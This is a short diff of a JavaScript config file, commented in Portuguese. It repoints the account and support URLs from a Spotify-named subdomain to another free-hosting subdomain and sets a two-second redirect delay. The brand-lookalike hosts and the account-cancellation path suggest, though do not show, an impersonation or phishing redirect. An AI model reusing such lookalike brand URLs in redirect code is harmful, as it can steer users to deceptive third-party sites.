@@ -1,7 +1,7 @@
 // Configurações da aplicação
 const CONFIG = {
-    ACCOUNT_URL: 'https://portalspotify.onrender.com/encerrar',
-    SUPPORT_URL: 'https://portalspotify.onrender.com/encerrar',
+    ACCOUNT_URL: 'https://suporteonline.onrender.com/encerrar',
+    SUPPORT_URL: 'https://suporteonline.onrender.com/encerrar',
     REDIRECT_DELAY: 2000 // 2 segundos
 };
 
